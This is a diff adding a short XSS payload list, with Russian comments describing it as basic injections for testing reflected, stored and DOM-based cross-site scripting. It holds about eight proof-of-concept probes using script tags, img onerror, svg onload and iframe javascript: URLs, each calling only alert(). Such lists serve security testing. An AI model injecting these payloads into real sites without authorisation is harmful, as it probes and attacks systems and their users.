@@ -1,0 +1,14 @@
+# xss_payloads.txt
+# ----------------
+# Простейшие XSS-инъекции для тестирования Reflected/Stored
+
+<script>alert(1)</script>
+"><script>alert(2)</script>
+"><img src=x onerror=alert(3)>
+"><svg onload=alert(4)>
+" onload=alert(5)
+"><iframe src=javascript:alert(6)>
+
+# DOM-based проверки (fragment):
+# <script>alert('DOM')</script>
+# <svg onload=alert('DOM2')>
